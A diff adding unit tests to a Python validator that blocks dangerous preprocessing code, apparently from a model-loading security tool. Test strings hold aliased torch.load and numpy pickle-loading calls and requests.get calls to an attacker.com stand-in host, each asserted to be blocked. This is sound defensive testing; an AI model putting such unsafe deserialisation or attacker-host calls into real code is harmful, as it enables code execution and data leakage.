@@ -129,6 +129,50 @@ class TestDangerousPatternBlocked:
         assert r.grade == "C"
         assert r.status == "BLOCK"
 
+    def test_torch_load_alias_blocked(self):
+        code = (
+            "import torch as t\n"
+            "class EvilProcessor:\n"
+            "    def process(self, path):\n"
+            "        return t.load(path)\n"
+        )
+        r = validate_preprocessing_file(code, "processing_evil.py")
+        assert r.grade == "C"
+        assert r.status == "BLOCK"
+
+    def test_from_torch_import_load_blocked(self):
+        code = (
+            "from torch import load\n"
+            "class EvilProcessor:\n"
+            "    def process(self, path):\n"
+            "        return load(path)\n"
+        )
+        r = validate_preprocessing_file(code, "processing_evil.py")
+        assert r.grade == "C"
+        assert r.status == "BLOCK"
+
+    def test_numpy_load_allow_pickle_alias_blocked(self):
+        code = (
+            "import numpy as np\n"
+            "class EvilProcessor:\n"
+            "    def process(self, path):\n"
+            "        return np.load(path, allow_pickle=True)\n"
+        )
+        r = validate_preprocessing_file(code, "processing_evil.py")
+        assert r.grade == "C"
+        assert r.status == "BLOCK"
+
+    def test_from_numpy_import_load_alias_blocked(self):
+        code = (
+            "from numpy import load as npload\n"
+            "class EvilProcessor:\n"
+            "    def process(self, path):\n"
+            "        return npload(path, allow_pickle=True)\n"
+        )
+        r = validate_preprocessing_file(code, "processing_evil.py")
+        assert r.grade == "C"
+        assert r.status == "BLOCK"
+
     def test_os_system_blocked(self):
         code = (
             "import os\n"
@@ -199,6 +243,19 @@ class TestDangerousPatternBlocked:
             "class EvilProcessor:\n"
             "    def process(self, x):\n"
             "        requests.get('http://attacker.com')\n"
+            "        return np.array(x)\n"
+        )
+        r = validate_preprocessing_file(code, "processing_evil.py")
+        assert r.grade == "C"
+        assert r.status == "BLOCK"
+
+    def test_requests_alias_blocked(self):
+        code = (
+            "import numpy as np\n"
+            "import requests as r\n"
+            "class EvilProcessor:\n"
+            "    def process(self, x):\n"
+            "        r.get('http://attacker.com')\n"
             "        return np.array(x)\n"
         )
         r = validate_preprocessing_file(code, "processing_evil.py")
